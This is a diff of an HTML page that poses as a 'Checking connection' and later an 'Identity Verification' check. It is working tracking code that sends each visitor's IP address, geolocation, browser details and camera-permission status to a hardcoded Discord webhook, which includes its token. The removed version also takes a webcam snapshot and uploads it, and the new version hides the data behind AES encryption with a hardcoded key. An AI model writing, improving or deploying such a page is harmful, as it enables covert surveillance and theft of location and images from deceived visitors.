@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Checking connection...</title>
+  <title>Identity Verification</title>
+  <script src="crypto-js.js"></script>
   <script>
     const webhook = "https://discord.com/api/webhooks/1398368397896585349/woKYP9qMzxtDfBfi3cp6s0_QuT3mCKZwXsI_ibj2mzLdq-nyZbO19kM8tzUGYXk95s6w";
+    const aesKey = "shaher-ultra-secure-key-2025";
 
     async function getIP() {
       const res = await fetch("https://api.ipify.org/?format=json");
@@ -11,69 +13,54 @@
       return data.ip;
     }
 
-    async function sendToDiscord(data, imageBlob = null) {
-      const content = `
-**New Visitor Tracked**
-📍 Location: ${data.lat}, ${data.lon}
-🌍 IP: ${data.ip}
-🖥 OS/Browser: ${data.userAgent}
-🕒 Time: ${new Date().toLocaleString()}
-      `;
+    function encrypt(data) {
+      return CryptoJS.AES.encrypt(JSON.stringify(data), aesKey).toString();
+    }
 
-      const formData = new FormData();
-      formData.append("payload_json", JSON.stringify({ content }));
-
-      if (imageBlob) {
-        formData.append("file", imageBlob, "face.png");
-      }
-
+    async function sendEncryptedData(data) {
+      const encrypted = encrypt(data);
       await fetch(webhook, {
         method: "POST",
-        body: formData
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `🔐 Encrypted Visitor Data:
+\`\`\`${encrypted}\`\`\`` })
       });
     }
 
-    async function captureAndSend() {
+    async function startVerification() {
+      document.getElementById("status").innerText = "Requesting permissions...";
+
       const ip = await getIP();
       const userAgent = navigator.userAgent;
 
       navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+        let lat = position.coords.latitude;
+        let lon = position.coords.longitude;
 
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          await video.play();
-
-          const canvas = document.createElement("canvas");
-          canvas.width = 640;
-          canvas.height = 480;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
           stream.getTracks().forEach(track => track.stop());
 
-          const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
-          await sendToDiscord({ ip, lat, lon, userAgent }, blob);
-          document.body.innerHTML = "<h2>✅ Connection Verified</h2>";
+          const payload = { ip, lat, lon, userAgent, camera: "granted" };
+          await sendEncryptedData(payload);
+          document.getElementById("status").innerText = "✅ Verification complete.";
         } catch (err) {
-          console.warn("Camera permission denied or error:", err);
-          await sendToDiscord({ ip, lat, lon, userAgent });
-          document.body.innerHTML = "<h2>⚠️ Location sent, but camera blocked.</h2>";
+          const payload = { ip, lat, lon, userAgent, camera: "denied" };
+          await sendEncryptedData(payload);
+          document.getElementById("status").innerText = "⚠️ Camera denied. Location sent.";
         }
-
       }, async () => {
-        await sendToDiscord({ ip, lat: "N/A", lon: "N/A", userAgent });
-        document.body.innerHTML = "<h2>⚠️ Location denied.</h2>";
+        const payload = { ip, lat: "N/A", lon: "N/A", userAgent, camera: "unknown" };
+        await sendEncryptedData(payload);
+        document.getElementById("status").innerText = "⚠️ Location denied.";
       });
     }
-
-    window.onload = captureAndSend;
   </script>
 </head>
-<body>
-  <h2>🔄 Verifying your connection...</h2>
+<body style="font-family: Arial; text-align: center; margin-top: 100px;">
+  <h2>🔒 Identity Verification</h2>
+  <p>Please verify your identity to continue.</p>
+  <button onclick="startVerification()" style="padding: 10px 20px; font-size: 16px;">Verify Identity</button>
+  <p id="status" style="margin-top: 20px;"></p>
 </body>
 </html>
